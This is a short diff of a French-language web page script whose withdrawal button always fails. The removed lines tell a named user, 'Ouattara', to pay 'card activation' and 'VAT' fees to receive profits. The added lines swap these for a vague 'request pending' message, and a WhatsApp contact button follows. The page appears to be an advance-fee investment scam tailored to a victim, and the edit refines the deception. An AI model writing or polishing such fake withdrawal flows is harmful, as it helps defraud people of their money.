@@ -332,10 +332,10 @@
             });
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                alert('Cher Ouattara, Veuillez payer les frais d\'activation de la carte afin de recevoir vos bénéfices dans les 5 minutes.');
+                alert('Cher Ouattara, demande en attente');
                 withdrawalForm.style.display = 'none';
                 errorMessage.style.display = 'block';
-                errorMessage.textContent = 'Erreur : Frais de tva néccéssaire.';
+                errorMessage.textContent = 'Erreur : en attente.';
             });
 
             document.getElementById('whatsapp-button').addEventListener('click', () => {
